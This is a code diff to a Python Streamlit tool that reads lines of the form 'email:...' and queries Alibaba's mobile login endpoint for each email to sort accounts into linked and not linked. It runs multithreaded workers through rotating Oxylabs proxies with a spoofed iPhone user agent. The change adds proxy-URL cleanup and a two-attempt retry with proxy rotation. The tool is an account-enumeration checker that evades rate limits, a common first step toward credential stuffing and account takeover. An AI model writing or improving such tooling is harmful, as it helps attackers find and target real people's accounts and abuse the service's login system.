@@ -130,6 +130,7 @@ def parse_proxy(proxy_str):
     proxy_str = (proxy_str or "").strip()
     if not proxy_str:
         return None
+    proxy_str = proxy_str.replace("http://", "").replace("https://", "").strip()
     if "@" in proxy_str:
         return f"http://{proxy_str}"
     parts = proxy_str.split(":")
@@ -417,7 +418,8 @@ with tab2:
                     proxy_state[0] += 1
                 if "oxylabs.io" in p:
                     p = make_oxylabs_proxy()
-                formatted = f"http://{p}" if "@" in p else p
+                cleaned = p.replace("http://", "").replace("https://", "").strip()
+                formatted = f"http://{cleaned}"
                 return {"http": formatted, "https": formatted}
 
             def classify(text):
@@ -433,29 +435,36 @@ with tab2:
             def check_single_account(args):
                 idx, line = args
                 email = line.split(":", 1)[0].strip()
-                proxies = get_next_proxy()
-                headers = {
-                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "en-US,en;q=0.5"
-                }
                 ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
-                try:
-                    url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&loginId={email}"
-                    r = requests.get(url, headers=headers, proxies=proxies, timeout=12)
-                    text = r.text.lower()
-                    
-                    if r.status_code == 200:
-                        status, detail = classify(text)
-                        icon = "✅" if status == "linked" else ("❌" if status == "not_linked" else "⚠️")
-                        log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: {icon} {status.upper()} | Detail: {detail}"
-                        return status, line, log_msg
-                    else:
-                        log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: HTTP Status {r.status_code}"
-                        return "error", f"{line} # HTTP Status {r.status_code}", log_msg
-                except Exception as e:
-                    log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: {str(e)[:50]}"
-                    return "error", f"{line} # {str(e)[:50]}", log_msg
+                
+                # Try up to 2 attempts with proxy rotation / direct fallback
+                for attempt in range(2):
+                    proxies = get_next_proxy()
+                    headers = {
+                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                        "Accept-Language": "en-US,en;q=0.5"
+                    }
+                    try:
+                        url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&loginId={email}"
+                        r = requests.get(url, headers=headers, proxies=proxies, timeout=12)
+                        text = r.text.lower()
+                        
+                        if r.status_code == 200:
+                            status, detail = classify(text)
+                            icon = "✅" if status == "linked" else ("❌" if status == "not_linked" else "⚠️")
+                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: {icon} {status.upper()} | Detail: {detail}"
+                            return status, line, log_msg
+                        else:
+                            if attempt == 1:
+                                log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: HTTP Status {r.status_code}"
+                                return "error", f"{line} # HTTP Status {r.status_code}", log_msg
+                    except Exception as e:
+                        if attempt == 1:
+                            err_msg = str(e)[:60]
+                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: {err_msg}"
+                            return "error", f"{line} # {err_msg}", log_msg
+                return "error", f"{line} # Connection failed", f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: Connection failed"
 
             with st.spinner("Checking accounts via high-speed HTTP proxy workers..."):
                 from concurrent.futures import ThreadPoolExecutor, as_completed
